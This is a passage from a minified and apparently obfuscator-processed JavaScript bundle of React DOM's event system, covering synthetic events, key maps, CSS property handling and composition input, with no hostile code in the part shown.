      if (3 !== f.tag) throw Error(o(188));
      return f.stateNode.current === f ? e : a;
    }(e))) return null;
    for (var a = e;;) {
      if (5 === a.tag || 6 === a.tag) return a;
      if (a.child) a.child.return = a, a = a.child; else {
        if (a === e) break;
        for (; !a.sibling;) {
          if (!a.return || a.return === e) return null;
          a = a.return;
        }
        a.sibling.return = a.return, a = a.sibling;
      }
    }
    return null;
  }
  var dn, Dn, bn, Cn = false, mn = [], vn = null, gn = null, _n = null, hn = new Map, wn = new Map, pn = [], yn = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput close cancel copy cut paste click change contextmenu reset submit".split(" "), zn = "focus blur dragenter dragleave mouseover mouseout pointerover pointerout gotpointercapture lostpointercapture".split(" ");
  function Bn(e, n, a, i) {
    var u = f, r = {};
    return r.blockedOn = e, r.topLevelType = n, r.eventSystemFlags = 32 | a, r.nativeEvent = i, r;
  }
  function Ln(e, n) {
    var a = f;
    switch (e) {
      case "focus":
      case "blur":
        vn = null;
        break;
      case "dragenter":
      case "dragleave":
        gn = null;
        break;
      case "mouseover":
      case "mouseout":
        _n = null;
        break;
      case "pointerover":
      case "pointerout":
        hn.delete(n.pointerId);
        break;
      case "gotpointercapture":
      case "lostpointercapture":
        wn.delete(n.pointerId);
    }
  }
  function Mn(e, n, a, i, u) {
    var r = f;
    return null === e || e.nativeEvent !== u ? (e = Bn(n, a, i, u), null !== n && null !== (n = Sf(n)) && Dn(n), e) : (e.eventSystemFlags |= i, e);
  }
  function Fn(e) {
    var n = f, a = jf(e.target);
    if (null !== a) {
      var i = tn(a);
      if (null !== i) if (13 === (a = i.tag)) {
        if (null !== (a = xn(i))) return e.blockedOn = a, void r.unstable_runWithPriority(e.priority, function () {
          bn(i);
        });
      } else if (3 === a && i.stateNode.hydrate) return void (e.blockedOn = 3 === i.tag ? i.stateNode.containerInfo : null);
    }
    e.blockedOn = null;
  }
  function An(e) {
    var n = f;
    if (null !== e.blockedOn) return false;
    var a = $a(e.topLevelType, e.eventSystemFlags, e.nativeEvent);
    if (null !== a) {
      var i = Sf(a);
      return null !== i && Dn(i), e.blockedOn = a, false;
    }
    return true;
  }
  function kn(e, n, a) {
    var i = f;
    An(e) && a.delete(n);
  }
  function En() {
    var e = f;
    for (Cn = false; 0 < mn.length;) {
      var n = mn[0];
      if (null !== n.blockedOn) {
        null !== (n = Sf(n.blockedOn)) && dn(n);
        break;
      }
      var a = $a(n.topLevelType, n.eventSystemFlags, n.nativeEvent);
      null !== a ? n.blockedOn = a : mn.shift();
    }
    null !== vn && An(vn) && (vn = null), null !== gn && An(gn) && (gn = null), null !== _n && An(_n) && (_n = null), hn.forEach(kn), wn.forEach(kn);
  }
  function jn(e, n) {
    var a = f;
    e.blockedOn === n && (e.blockedOn = null, Cn || (Cn = true, r.unstable_scheduleCallback(r.unstable_NormalPriority, En)));
  }
  function Sn(e) {
    var n = f;
    function a(n) {
      return jn(n, e);
    }
    if (0 < mn.length) {
      jn(mn[0], e);
      for (var i = 1; i < mn.length; i++) {
        var u = mn[i];
        u.blockedOn === e && (u.blockedOn = null);
      }
    }
    for (null !== vn && jn(vn, e), null !== gn && jn(gn, e), null !== _n && jn(_n, e), hn.forEach(a), wn.forEach(a), i = 0; i < pn.length; i++) (u = pn[i]).blockedOn === e && (u.blockedOn = null);
    for (; 0 < pn.length && null === (i = pn[0]).blockedOn;) Fn(i), null === i.blockedOn && pn.shift();
  }
  function Tn(e) {
    var n = f;
    return (e = e.target || e.srcElement || window).correspondingUseElement && (e = e.correspondingUseElement), 3 === e.nodeType ? e.parentNode : e;
  }
  function Pn(e) {
    var n = f;
    do {
      e = e.return;
    } while (e && 5 !== e.tag);
    return e || null;
  }
  function Hn(e, n, a) {
    var i = f;
    (n = S(e, a.dispatchConfig.phasedRegistrationNames[n])) && (a._dispatchListeners = L(a._dispatchListeners, n), a._dispatchInstances = L(a._dispatchInstances, e));
  }
  function Nn(e) {
    var n = f;
    if (e && e.dispatchConfig.phasedRegistrationNames) {
      for (var a = e._targetInst, i = []; a;) i.push(a), a = Pn(a);
      for (a = i.length; 0 < a--;) Hn(i[a], "captured", e);
      for (a = 0; a < i.length; a++) Hn(i[a], "bubbled", e);
    }
  }
  function qn(e, n, a) {
    var i = f;
    e && a && a.dispatchConfig.registrationName && (n = S(e, a.dispatchConfig.registrationName)) && (a._dispatchListeners = L(a._dispatchListeners, n), a._dispatchInstances = L(a._dispatchInstances, e));
  }
  function Kn(e) {
    var n = f;
    e && e.dispatchConfig.registrationName && qn(e._targetInst, null, e);
  }
  function Un(e) {
    M(e, Nn);
  }
  function Zn() {
    return true;
  }
  function Gn() {
    return false;
  }
  function Yn(e, n, a, i) {
    var u = f;
    for (var r in this.dispatchConfig = e, this._targetInst = n, this.nativeEvent = a, e = this.constructor.Interface) e.hasOwnProperty(r) && ((n = e[r]) ? this[r] = n(a) : "target" === r ? this.target = i : this[r] = a[r]);
    return this.isDefaultPrevented = (null != a.defaultPrevented ? a.defaultPrevented : false === a.returnValue) ? Zn : Gn, this.isPropagationStopped = Gn, this;
  }
  function Vn(e, n, a, i) {
    var u = f;
    if (this.eventPool.length) {
      var r = this.eventPool.pop();
      return this.call(r, e, n, a, i), r;
    }
    return new this(e, n, a, i);
  }
  function In(e) {
    var n = f;
    if (!(e instanceof this)) throw Error(o(279));
    e.destructor(), 10 > this.eventPool.length && this.eventPool.push(e);
  }
  function Wn(e) {
    var n = f;
    e.eventPool = [], e.getPooled = Vn, e.release = In;
  }
  var Jn = {};
  Jn.preventDefault = function () {
    var e = f;
    this.defaultPrevented = true;
    var n = this.nativeEvent;
    n && (n.preventDefault ? n.preventDefault() : "unknown" != typeof n.returnValue && (n.returnValue = false), this.isDefaultPrevented = Zn);
  }, Jn.stopPropagation = function () {
    var e = f, n = this.nativeEvent;
    n && (n.stopPropagation ? n.stopPropagation() : "unknown" != typeof n.cancelBubble && (n.cancelBubble = true), this.isPropagationStopped = Zn);
  }, Jn.persist = function () {
    this.isPersistent = Zn;
  }, Jn.isPersistent = Gn, Jn.destructor = function () {
    var e, n = f, a = this.constructor.Interface;
    for (e in a) this[e] = null;
    this.nativeEvent = this._targetInst = this.dispatchConfig = null, this.isPropagationStopped = this.isDefaultPrevented = Gn, this._dispatchInstances = this._dispatchListeners = null;
  };
  var Rn = {};
  Rn.type = null, Rn.target = null, Rn.currentTarget = function () {
    return null;
  }, Rn.eventPhase = null, Rn.bubbles = null, Rn.cancelable = null, Rn.timeStamp = function (e) {
    var n = f;
    return e.timeStamp || Date.now();
  }, Rn.defaultPrevented = null, Rn.isTrusted = null, u(Yn.prototype, Jn), Yn.Interface = Rn, Yn.extend = function (e) {
    var n = f;
    function a() {}
    function i() {
      var e = _0x28ad;
      return r.apply(this, arguments);
    }
    var r = this;
    a.prototype = r.prototype;
    var o = new a;
    return u(o, i.prototype), i.prototype = o, i.prototype.constructor = i, i.Interface = u({}, r.Interface, e), i.extend = r.extend, Wn(i), i;
  }, Wn(Yn);
  var On = {};
  On.animationName = null, On.elapsedTime = null, On.pseudoElement = null;
  var Xn = {};
  Xn.clipboardData = function (e) {
    var n = f;
    return "clipboardData" in e ? e.clipboardData : window.clipboardData;
  };
  var $n = {};
  $n.view = null, $n.detail = null;
  var Qn = {};
  Qn.relatedTarget = null;
  var ea = Yn.extend(On), na = Yn.extend(Xn), aa = Yn.extend($n), fa = aa.extend(Qn);
  function ia(e) {
    var n = f, a = e.keyCode;
    return "charCode" in e ? 0 === (e = e.charCode) && 13 === a && (e = 13) : e = a, 10 === e && (e = 13), 32 <= e || 13 === e ? e : 0;
  }
  var ua = {};
  ua.Esc = "Escape", ua.Spacebar = " ", ua.Left = "ArrowLeft", ua.Up = "ArrowUp", ua.Right = "ArrowRight", ua.Down = "ArrowDown", ua.Del = "Delete", ua.Win = "OS", ua.Menu = "ContextMenu", ua.Apps = "ContextMenu", ua.Scroll = "ScrollLock", ua.MozPrintableKey = "Unidentified";
  var ra = {};
  ra[8] = "Backspace", ra[9] = "Tab", ra[12] = "Clear", ra[13] = "Enter", ra[16] = "Shift", ra[17] = "Control", ra[18] = "Alt", ra[19] = "Pause", ra[20] = "CapsLock", ra[27] = "Escape", ra[32] = " ", ra[33] = "PageUp", ra[34] = "PageDown", ra[35] = "End", ra[36] = "Home", ra[37] = "ArrowLeft", ra[38] = "ArrowUp", ra[39] = "ArrowRight", ra[40] = "ArrowDown", ra[45] = "Insert", ra[46] = "Delete", ra["112"] = "F1", ra["113"] = "F2", ra["114"] = "F3", ra["115"] = "F4", ra["116"] = "F5", ra["117"] = "F6", ra["118"] = "F7", ra["119"] = "F8", ra["120"] = "F9", ra["121"] = "F10", ra["122"] = "F11", ra["123"] = "F12", ra["144"] = "NumLock", ra["145"] = "ScrollLock", ra["224"] = "Meta";
  var oa = {};
  oa.Alt = "altKey", oa.Control = "ctrlKey", oa.Meta = "metaKey", oa.Shift = "shiftKey";
  var ca = ua, ta = ra, xa = oa;
  function sa(e) {
    var n = f, a = this.nativeEvent;
    return a.getModifierState ? a.getModifierState(e) : !!(e = xa[e]) && !!a[e];
  }
  function la() {
    return sa;
  }
  var da = {};
  da.key = function (e) {
    var n = f;
    if (e.key) {
      var a = ca[e.key] || e.key;
      if ("Unidentified" !== a) return a;
    }
    return "keypress" === e.type ? 13 === (e = ia(e)) ? "Enter" : String.fromCharCode(e) : "keydown" === e.type || "keyup" === e.type ? ta[e.keyCode] || "Unidentified" : "";
  }, da.location = null, da.ctrlKey = null, da.shiftKey = null, da.altKey = null, da.metaKey = null, da.repeat = null, da.locale = null, da.getModifierState = la, da.charCode = function (e) {
    var n = f;
    return "keypress" === e.type ? ia(e) : 0;
  }, da.keyCode = function (e) {
    var n = f;
    return "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0;
  }, da.which = function (e) {
    var n = f;
    return "keypress" === e.type ? ia(e) : "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0;
  };
  var Da = {};
  Da.pointerId = null, Da.width = null, Da.height = null, Da.pressure = null, Da.tangentialPressure = null, Da.tiltX = null, Da.tiltY = null, Da.twist = null, Da.pointerType = null, Da.isPrimary = null;
  var ba = {};
  ba.dataTransfer = null;
  var Ca = {};
  Ca.propertyName = null, Ca.elapsedTime = null, Ca.pseudoElement = null;
  for (var ma = aa.extend(da), va = 0, ga = 0, _a = false, ha = false, wa = aa.extend({screenX: null, screenY: null, clientX: null, clientY: null, pageX: null, pageY: null, ctrlKey: null, shiftKey: null, altKey: null, metaKey: null, getModifierState: la, button: null, buttons: null, relatedTarget: function (e) {
    var n = f;
    return e.relatedTarget || (e.fromElement === e.srcElement ? e.toElement : e.fromElement);
  }, movementX: function (e) {
    var n = f;
    if ("movementX" in e) return e.movementX;
    var a = va;
    return va = e.screenX, _a ? "mousemove" === e.type ? e.screenX - a : 0 : (_a = true, 0);
  }, movementY: function (e) {
    var n = f;
    if ("movementY" in e) return e.movementY;
    var a = ga;
    return ga = e.screenY, ha ? "mousemove" === e.type ? e.screenY - a : 0 : (ha = true, 0);
  }}), pa = wa.extend(Da), ya = wa.extend(ba), za = aa.extend({touches: null, targetTouches: null, changedTouches: null, altKey: null, metaKey: null, ctrlKey: null, shiftKey: null, getModifierState: la}), Ba = Yn.extend(Ca), La = wa.extend({deltaX: function (e) {
    var n = f;
    return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0;
  }, deltaY: function (e) {
    var n = f;
    return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0;
  }, deltaZ: null, deltaMode: null}), Ma = [["blur", "blur", 0], ["cancel", "cancel", 0], ["click", "click", 0], ["close", "close", 0], ["contextmenu", "contextMenu", 0], ["copy", "copy", 0], ["cut", "cut", 0], ["auxclick", "auxClick", 0], ["dblclick", "doubleClick", 0], ["dragend", "dragEnd", 0], ["dragstart", "dragStart", 0], ["drop", "drop", 0], ["focus", "focus", 0], ["input", "input", 0], ["invalid", "invalid", 0], ["keydown", "keyDown", 0], ["keypress", "keyPress", 0], ["keyup", "keyUp", 0], ["mousedown", "mouseDown", 0], ["mouseup", "mouseUp", 0], ["paste", "paste", 0], ["pause", "pause", 0], ["play", "play", 0], ["pointercancel", "pointerCancel", 0], ["pointerdown", "pointerDown", 0], ["pointerup", "pointerUp", 0], ["ratechange", "rateChange", 0], ["reset", "reset", 0], ["seeked", "seeked", 0], ["submit", "submit", 0], ["touchcancel", "touchCancel", 0], ["touchend", "touchEnd", 0], ["touchstart", "touchStart", 0], ["volumechange", "volumeChange", 0], ["drag", "drag", 1], ["dragenter", "dragEnter", 1], ["dragexit", "dragExit", 1], ["dragleave", "dragLeave", 1], ["dragover", "dragOver", 1], ["mousemove", "mouseMove", 1], ["mouseout", "mouseOut", 1], ["mouseover", "mouseOver", 1], ["pointermove", "pointerMove", 1], ["pointerout", "pointerOut", 1], ["pointerover", "pointerOver", 1], ["scroll", "scroll", 1], ["toggle", "toggle", 1], ["touchmove", "touchMove", 1], ["wheel", "wheel", 1], ["abort", "abort", 2], [fn, "animationEnd", 2], [un, "animationIteration", 2], [rn, "animationStart", 2], ["canplay", "canPlay", 2], ["canplaythrough", "canPlayThrough", 2], ["durationchange", "durationChange", 2], ["emptied", "emptied", 2], ["encrypted", "encrypted", 2], ["ended", "ended", 2], ["error", "error", 2], ["gotpointercapture", "gotPointerCapture", 2], ["load", "load", 2], ["loadeddata", "loadedData", 2], ["loadedmetadata", "loadedMetadata", 2], ["loadstart", "loadStart", 2], ["lostpointercapture", "lostPointerCapture", 2], ["playing", "playing", 2], ["progress", "progress", 2], ["seeking", "seeking", 2], ["stalled", "stalled", 2], ["suspend", "suspend", 2], ["timeupdate", "timeUpdate", 2], [on, "transitionEnd", 2], ["waiting", "waiting", 2]], Fa = {}, Aa = {}, ka = 0; ka < Ma.length; ka++) {
    var Ea = Ma[ka], ja = Ea[0], Sa = Ea[1], Ta = Ea[2], Pa = "on" + (Sa[0].toUpperCase() + Sa.slice(1)), Ha = {phasedRegistrationNames: {bubbled: Pa, captured: Pa + "Capture"}, dependencies: [ja], eventPriority: Ta};
    Fa[Sa] = Ha, Aa[ja] = Ha;
  }
  var Na = {};
  Na.eventTypes = Fa, Na.getEventPriority = function (e) {
    var n = f;
    return void 0 !== (e = Aa[e]) ? e.eventPriority : 2;
  }, Na.extractEvents = function (e, n, a, i) {
    var u = f, r = Aa[e];
    if (!r) return null;
    switch (e) {
      case "keypress":
        if (0 === ia(a)) return null;
      case "keydown":
      case "keyup":
        e = ma;
        break;
      case "blur":
      case "focus":
        e = fa;
        break;
      case "click":
        if (2 === a.button) return null;
      case "auxclick":
      case "dblclick":
      case "mousedown":
      case "mousemove":
      case "mouseup":
      case "mouseout":
      case "mouseover":
      case "contextmenu":
        e = wa;
        break;
      case "drag":
      case "dragend":
      case "dragenter":
      case "dragexit":
      case "dragleave":
      case "dragover":
      case "dragstart":
      case "drop":
        e = ya;
        break;
      case "touchcancel":
      case "touchend":
      case "touchmove":
      case "touchstart":
        e = za;
        break;
      case fn:
      case un:
      case rn:
        e = ea;
        break;
      case on:
        e = Ba;
        break;
      case "scroll":
        e = aa;
        break;
      case "wheel":
        e = La;
        break;
      case "copy":
      case "cut":
      case "paste":
        e = na;
        break;
      case "gotpointercapture":
      case "lostpointercapture":
      case "pointercancel":
      case "pointerdown":
      case "pointermove":
      case "pointerout":
      case "pointerover":
      case "pointerup":
        e = pa;
        break;
      default:
        e = Yn;
    }
    return Un(n = e.getPooled(r, n, a, i)), n;
  };
  var qa = Na, Ka = r.unstable_UserBlockingPriority, Ua = r.unstable_runWithPriority, Za = qa.getEventPriority, Ga = [];
  function Ya(e) {
    var n = f, a = e.targetInst, i = a;
    do {
      if (!i) {
        e.ancestors.push(i);
        break;
      }
      var u = i;
      if (3 === u.tag) u = u.stateNode.containerInfo; else {
        for (; u.return;) u = u.return;
        u = 3 !== u.tag ? null : u.stateNode.containerInfo;
      }
      if (!u) break;
      5 !== (a = i.tag) && 6 !== a || e.ancestors.push(i), i = jf(u);
    } while (i);
    for (i = 0; i < e.ancestors.length; i++) {
      a = e.ancestors[i];
      var r = Tn(e.nativeEvent);
      u = e.topLevelType;
      for (var o = e.nativeEvent, c = e.eventSystemFlags, t = null, x = 0; x < l.length; x++) {
        var s = l[x];
        s && (s = s.extractEvents(u, a, o, r, c)) && (t = L(t, s));
      }
      k(t);
    }
  }
  var Va = true;
  function Ia(e, n) {
    Wa(n, e, false);
  }
  function Wa(e, n, a) {
    var i = f;
    switch (Za(n)) {
      case 0:
        var u = Ja.bind(null, n, 1);
        break;
      case 1:
        u = Ra.bind(null, n, 1);
        break;
      default:
        u = Xa.bind(null, n, 1);
    }
    a ? e.addEventListener(n, u, true) : e.addEventListener(n, u, false);
  }
  function Ja(e, n, a) {
    De || le();
    var f = Xa, i = De;
    De = true;
    try {
      se(f, e, n, a);
    } finally {
      (De = i) || Ce();
    }
  }
  function Ra(e, n, a) {
    Ua(Ka, Xa.bind(null, e, n, a));
  }
  function Oa(e, n, a, i) {
    var u = f;
    if (Ga.length) {
      var r = Ga.pop();
      r.topLevelType = e, r.eventSystemFlags = n, r.nativeEvent = a, r.targetInst = i, e = r;
    } else e = {topLevelType: e, eventSystemFlags: n, nativeEvent: a, targetInst: i, ancestors: []};
    try {
      if (n = Ya, a = e, be) n(a, void 0); else {
        be = true;
        try {
          de(n, a, void 0);
        } finally {
          be = false, Ce();
        }
      }
    } finally {
      e.topLevelType = null, e.nativeEvent = null, e.targetInst = null, e.ancestors.length = 0, Ga.length < 10 && Ga.push(e);
    }
  }
  function Xa(e, n, a) {
    var i = f;
    if (Va) if (0 < mn.length && -1 < yn.indexOf(e)) e = Bn(null, e, n, a), mn.push(e); else {
      var u = $a(e, n, a);
      null === u ? Ln(e, a) : -1 < yn.indexOf(e) ? (e = Bn(u, e, n, a), mn.push(e)) : function (e, n, a, f) {
        var u = i;
        switch (n) {
          case "focus":
            return vn = Mn(vn, e, n, a, f), true;
          case "dragenter":
            return gn = Mn(gn, e, n, a, f), true;
          case "mouseover":
            return _n = Mn(_n, e, n, a, f), true;
          case "pointerover":
            var r = f.pointerId;
            return hn.set(r, Mn(hn.get(r) || null, e, n, a, f)), true;
          case "gotpointercapture":
            return r = f.pointerId, wn.set(r, Mn(wn.get(r) || null, e, n, a, f)), true;
        }
        return false;
      }(u, e, n, a) || (Ln(e, a), Oa(e, n, a, null));
    }
  }
  function $a(e, n, a) {
    var i = f, u = Tn(a);
    if (null !== (u = jf(u))) {
      var r = tn(u);
      if (null === r) u = null; else {
        var o = r.tag;
        if (13 === o) {
          if (null !== (u = xn(r))) return u;
          u = null;
        } else if (3 === o) {
          if (r.stateNode.hydrate) return 3 === r.tag ? r.stateNode.containerInfo : null;
          u = null;
        } else r !== u && (u = null);
      }
    }
    return Oa(e, n, a, u), null;
  }
  function Qa(e) {
    var n = f;
    if (!fe) return false;
    var a = (e = "on" + e) in document;
    return a || ((a = document.createElement("div")).setAttribute(e, "return;"), a = "function" == typeof a[e]), a;
  }
  var ef = new ("function" == typeof WeakMap ? WeakMap : Map);
  function nf(e) {
    var n = f, a = ef.get(e);
    return void 0 === a && (a = new Set, ef.set(e, a)), a;
  }
  function af(e, n, a) {
    var i = f;
    if (!a.has(e)) {
      switch (e) {
        case "scroll":
          Wa(n, "scroll", true);
          break;
        case "focus":
        case "blur":
          Wa(n, "focus", true), Wa(n, "blur", true), a.add("blur"), a.add("focus");
          break;
        case "cancel":
        case "close":
          Qa(e) && Wa(n, e, true);
          break;
        case "invalid":
        case "submit":
        case "reset":
          break;
        default:
          -1 === cn.indexOf(e) && Ia(e, n);
      }
      a.add(e);
    }
  }
  var ff = {};
  ff.animationIterationCount = true, ff.borderImageOutset = true, ff.borderImageSlice = true, ff.borderImageWidth = true, ff.boxFlex = true, ff.boxFlexGroup = true, ff.boxOrdinalGroup = true, ff.columnCount = true, ff.columns = true, ff.flex = true, ff.flexGrow = true, ff.flexPositive = true, ff.flexShrink = true, ff.flexNegative = true, ff.flexOrder = true, ff.gridArea = true, ff.gridRow = true, ff.gridRowEnd = true, ff.gridRowSpan = true, ff.gridRowStart = true, ff.gridColumn = true, ff.gridColumnEnd = true, ff.gridColumnSpan = true, ff.gridColumnStart = true, ff.fontWeight = true, ff.lineClamp = true, ff.lineHeight = true, ff.opacity = true, ff.order = true, ff.orphans = true, ff.tabSize = true, ff.widows = true, ff.zIndex = true, ff.zoom = true, ff.fillOpacity = true, ff.floodOpacity = true, ff.stopOpacity = true, ff.strokeDasharray = true, ff.strokeDashoffset = true, ff.strokeMiterlimit = true, ff.strokeOpacity = true, ff.strokeWidth = true;
  var uf = ff, rf = ["Webkit", "ms", "Moz", "O"];
  function of(e, n, a) {
    var i = f;
    return null == n || "boolean" == typeof n || "" === n ? "" : a || "number" != typeof n || 0 === n || uf.hasOwnProperty(e) && uf[e] ? ("" + n).trim() : n + "px";
  }
  function cf(e, n) {
    var a = f;
    for (var i in e = e.style, n) if (n.hasOwnProperty(i)) {
      var u = 0 === i.indexOf("--"), r = of(i, n[i], u);
      "float" === i && (i = "cssFloat"), u ? e.setProperty(i, r) : e[i] = r;
    }
  }
  Object.keys(uf).forEach(function (e) {
    var n = f;
    rf.forEach(function (a) {
      var f = n;
      a = a + e.charAt(0).toUpperCase() + e.substring(1), uf[a] = uf[e];
    });
  });
  var tf = {};
  tf.menuitem = true;
  var xf = {};
  xf.area = true, xf.base = true, xf.br = true, xf.col = true, xf.embed = true, xf.hr = true, xf.img = true, xf.input = true, xf.keygen = true, xf.link = true, xf.meta = true, xf.param = true, xf.source = true, xf.track = true, xf.wbr = true;
  var sf = u(tf, xf);
  function lf(e, n) {
    var a = f;
    if (n) {
      if (sf[e] && (null != n.children || null != n.dangerouslySetInnerHTML)) throw Error(o(137, e, ""));
      if (null != n.dangerouslySetInnerHTML) {
        if (null != n.children) throw Error(o(60));
        if ("object" != typeof n.dangerouslySetInnerHTML || !("__html" in n.dangerouslySetInnerHTML)) throw Error(o(61));
      }
      if (null != n.style && "object" != typeof n.style) throw Error(o(62, ""));
    }
  }
  function df(e, n) {
    var a = f;
    if (-1 === e.indexOf("-")) return "string" == typeof n.is;
    switch (e) {
      case "annotation-xml":
      case "color-profile":
      case "font-face":
      case "font-face-src":
      case "font-face-uri":
      case "font-face-format":
      case "font-face-name":
      case "missing-glyph":
        return false;
      default:
        return true;
    }
  }
  function Df(e, n) {
    var a = f, i = nf(e = 9 === e.nodeType || 11 === e.nodeType ? e : e.ownerDocument);
    n = b[n];
    for (var u = 0; u < n.length; u++) af(n[u], e, i);
  }
  function bf() {}
  function Cf(e) {
    var n = f;
    if (void 0 === (e = e || ("undefined" != typeof document ? document : void 0))) return null;
    try {
      return e.activeElement || e.body;
    } catch (a) {
      return e.body;
    }
  }
  function mf(e) {
    for (var n = f; e && e.firstChild;) e = e.firstChild;
    return e;
  }
  function vf(e, n) {
    var a, i = f, u = mf(e);
    for (e = 0; u;) {
      if (3 === u.nodeType) {
        if (a = e + u.textContent.length, e <= n && a >= n) return {node: u, offset: n - e};
        e = a;
      }
      e: {
        for (; u;) {
          if (u.nextSibling) {
            u = u.nextSibling;
            break e;
          }
          u = u.parentNode;
        }
        u = void 0;
      }
      u = mf(u);
    }
  }
  function gf() {
    for (var e = f, n = window, a = Cf(); a instanceof n.HTMLIFrameElement;) {
      try {
        var i = "string" == typeof a.contentWindow.location.href;
      } catch (e) {
        i = false;
      }
      if (!i) break;
      a = Cf((n = a.contentWindow).document);
    }
    return a;
  }
  function _f(e) {
    var n = f, a = e && e.nodeName && e.nodeName.toLowerCase();
    return a && ("input" === a && ("text" === e.type || "search" === e.type || "tel" === e.type || "url" === e.type || "password" === e.type) || "textarea" === a || "true" === e.contentEditable);
  }
  var hf = null, wf = null;
  function pf(e, n) {
    var a = f;
    switch (e) {
      case "button":
      case "input":
      case "select":
      case "textarea":
        return !!n.autoFocus;
    }
    return false;
  }
  function yf(e, n) {
    var a = f;
    return "textarea" === e || "option" === e || "noscript" === e || "string" == typeof n.children || "number" == typeof n.children || "object" == typeof n.dangerouslySetInnerHTML && null !== n.dangerouslySetInnerHTML && null != n.dangerouslySetInnerHTML.__html;
  }
  var zf = "function" == typeof setTimeout ? setTimeout : void 0, Bf = "function" == typeof clearTimeout ? clearTimeout : void 0;
  function Lf(e) {
    for (var n = f; null != e; e = e.nextSibling) {
      var a = e.nodeType;
      if (1 === a || 3 === a) break;
    }
    return e;
  }
  function Mf(e) {
    var n = f;
    e = e.previousSibling;
    for (var a = 0; e;) {
      if (8 === e.nodeType) {
        var i = e.data;
        if ("$" === i || "$!" === i || "$?" === i) {
          if (0 === a) return e;
          a--;
        } else "/$" === i && a++;
      }
      e = e.previousSibling;
    }
    return null;
  }
  var Ff = Math.random().toString(36).slice(2), Af = "__reactInternalInstance$" + Ff, kf = "__reactEventHandlers$" + Ff, Ef = "__reactContainere$" + Ff;
  function jf(e) {
    var n = f, a = e[Af];
    if (a) return a;
    for (var i = e.parentNode; i;) {
      if (a = i[Ef] || i[Af]) {
        if (i = a.alternate, null !== a.child || null !== i && null !== i.child) for (e = Mf(e); null !== e;) {
          if (i = e[Af]) return i;
          e = Mf(e);
        }
        return a;
      }
      i = (e = i).parentNode;
    }
    return null;
  }
  function Sf(e) {
    var n = f;
    return !(e = e[Af] || e[Ef]) || 5 !== e.tag && 6 !== e.tag && 13 !== e.tag && 3 !== e.tag ? null : e;
  }
  function Tf(e) {
    var n = f;
    if (5 === e.tag || 6 === e.tag) return e.stateNode;
    throw Error(o(33));
  }
  function Pf(e) {
    return e[kf] || null;
  }
  var Hf = null, Nf = null, qf = null;
  function Kf() {
    var e = f;
    if (qf) return qf;
    var n, a, i = Nf, u = i.length, r = "value" in Hf ? Hf.value : Hf.textContent, o = r.length;
    for (n = 0; n < u && i[n] === r[n]; n++) ;
    var c = u - n;
    for (a = 1; a <= c && i[u - a] === r[o - a]; a++) ;
    return qf = r.slice(n, 1 < a ? 1 - a : void 0);
  }
  var Uf = {};
  Uf.data = null;
  var Zf = {};
  Zf.data = null;
  var Gf = Yn.extend(Uf), Yf = Yn.extend(Zf), Vf = [9, 13, 27, 32], If = fe && "CompositionEvent" in window, Wf = null;
  fe && "documentMode" in document && (Wf = document.documentMode);
  var Jf = {};
  Jf.bubbled = "onBeforeInput", Jf.captured = "onBeforeInputCapture";
  var Rf = {};
  Rf.phasedRegistrationNames = Jf, Rf.dependencies = ["compositionend", "keypress", "textInput", "paste"];
  var Of = {};
  Of.bubbled = "onCompositionEnd", Of.captured = "onCompositionEndCapture";
  var Xf = {};
  Xf.phasedRegistrationNames = Of, Xf.dependencies = "blur compositionend keydown keypress keyup mousedown".split(" ");
  var $f = {};
  $f.bubbled = "onCompositionStart", $f.captured = "onCompositionStartCapture";
  var Qf = {};
  Qf.phasedRegistrationNames = $f, Qf.dependencies = "blur compositionstart keydown keypress keyup mousedown".split(" ");
  var ei = {};
  ei.bubbled = "onCompositionUpdate", ei.captured = "onCompositionUpdateCapture";
  var ni = {};
  ni.phasedRegistrationNames = ei, ni.dependencies = "blur compositionupdate keydown keypress keyup mousedown".split(" ");
  var ai = {};
  ai.beforeInput = Rf, ai.compositionEnd = Xf, ai.compositionStart = Qf, ai.compositionUpdate = ni;
  var fi = fe && "TextEvent" in window && !Wf, ii = fe && (!If || Wf && 8 < Wf && 11 >= Wf), ui = String.fromCharCode(32), ri = ai, oi = false;
  function ci(e, n) {
    var a = f;
    switch (e) {
      case "keyup":
        return -1 !== Vf.indexOf(n.keyCode);
      case "keydown":
        return 229 !== n.keyCode;
      case "keypress":
      case "mousedown":
      case "blur":
        return true;
      default:
        return false;
    }
  }
  function ti(e) {
    var n = f;
    return "object" == typeof (e = e.detail) && "data" in e ? e.data : null;
  }
  var xi = false, si = {};
  si.eventTypes = ri, si.extractEvents = function (e, n, a, i) {
    var u, r = f;
    if (If) e: {
      switch (e) {
        case "compositionstart":
          var o = ri.compositionStart;
          break e;
        case "compositionend":
          o = ri.compositionEnd;
          break e;
        case "compositionupdate":
          o = ri.compositionUpdate;
          break e;
      }
      o = void 0;
    } else xi ? ci(e, a) && (o = ri.compositionEnd) : "keydown" === e && 229 === a.keyCode && (o = ri.compositionStart);
    return o ? (ii && "ko" !== a.locale && (xi || o !== ri.compositionStart ? o === ri.compositionEnd && xi && (u = Kf()) : (Nf = "value" in (Hf = i) ? Hf.value : Hf.textContent, xi = true)), o = Gf.getPooled(o, n, a, i), (u || null !== (u = ti(a))) && (o.data = u), Un(o), u = o) : u = null, (e = fi ? function (e, n) {
      var a = r;
      switch (e) {
        case "compositionend":
          return ti(n);
        case "keypress":
          return 32 !== n.which ? null : (oi = true, ui);
        case "textInput":
          return (e = n.data) === ui && oi ? null : e;
        default:
          return null;
      }
    }(e, a) : function (e, n) {
      var a = r;
      if (xi) return "compositionend" === e || !If && ci(e, n) ? (e = Kf(), qf = Nf = Hf = null, xi = false, e) : null;
      switch (e) {
        case "paste":
          return null;
        case "keypress":
          if (!(n.ctrlKey || n.altKey || n.metaKey) || n.ctrlKey && n.altKey) {
            if (n.char && 1 < n.char.length) return n.char;
            if (n.which) return String.fromCharCode(n.which);
          }
          return null;
        case "compositionend":
          return ii && "ko" !== n.locale ? null : n.data;
        default:
          return null;
      }
    }(e, a)) ? ((n = Yf.getPooled(ri.beforeInput, n, a, i)).data = e, Un(n)) : n = null, null === u ? n : null === n ? u : [u, n];
  };
  var li = {};
